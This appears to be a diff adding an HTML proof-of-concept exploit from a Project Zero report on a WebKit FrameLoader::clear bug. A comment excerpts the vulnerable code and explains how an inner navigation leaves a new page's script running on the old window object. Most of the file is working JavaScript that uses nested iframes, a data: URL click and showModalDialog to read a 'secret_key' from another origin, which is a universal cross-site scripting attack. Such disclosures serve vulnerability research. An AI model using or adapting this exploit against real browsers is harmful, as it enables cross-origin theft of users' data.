@@ -1,0 +1,86 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1162
+
+void FrameLoader::clear(Document* newDocument, bool clearWindowProperties, bool clearScriptObjects, bool clearFrameView)
+{
+    m_frame.editor().clear();
+
+    if (!m_needsClear)
+        return;
+    m_needsClear = false;
+    
+    if (m_frame.document()->pageCacheState() != Document::InPageCache) {
+        ...
+        m_frame.document()->prepareForDestruction(); <<-------- (a)
+        if (hadLivingRenderTree)
+            m_frame.document()->removeFocusedNodeOfSubtree(*m_frame.document());
+    }
+    ...
+    m_frame.setDocument(nullptr); <<------- (b)
+    ...
+    if (clearWindowProperties)
+        m_frame.script().setDOMWindowForWindowShell(newDocument->domWindow()); <<------- (c)
+    ...
+}
+
+FrameLoader::clear is called when page navigation is made and it does:
+1. clear the old document at (b).
+2. attach the new window object at (c).
+
+If a new page navigation is made at (a), the new window will not attached due to |m_needsClear| check. As a result, the new document's script will be execute on the old window object.
+
+PoC will reproduce to steal |secret_key| value from another origin(data:text/html,...).
+
+PoC:
+-->
+
+<body>
+Click anywhere.
+<script>
+function createURL(data, type = 'text/html') {
+    return URL.createObjectURL(new Blob([data], {type: type}));
+}
+
+window.onclick = () => {
+    window.onclick = null;
+
+    let f = document.body.appendChild(document.createElement('iframe'));
+    f.contentDocument.open();
+    f.contentDocument.onreadystatechange = () => {
+        f.contentDocument.onreadystatechange = null;
+
+        let g = f.contentDocument.appendChild(document.createElement('iframe'));
+        g.contentDocument.open();
+        g.contentDocument.onreadystatechange = () => {
+            g.contentDocument.onreadystatechange = null;
+
+            f.contentWindow.__defineGetter__('navigator', function () {
+                return {};
+            });
+
+            let a = f.contentDocument.createElement('a');
+            a.href = 'data:text/html,' + encodeURI(`<script>var secret_key = '23412341234';</scrip` + 't>');
+            a.click();
+
+            showModalDialog(createURL(`
+<script>
+let it = setInterval(() => {
+    try {
+        opener[0].frameElement.contentDocument.x;
+    } catch (e) {
+        clearInterval(it);
+        window.close();
+    }
+}, 100);
+</scrip` + 't>'));
+
+            alert('secret_key:' + f.contentWindow.secret_key);
+            //showModalDialog('about:blank');
+        };
+    };
+
+    f.src = 'javascript:""';
+}
+
+</script>
+</body>
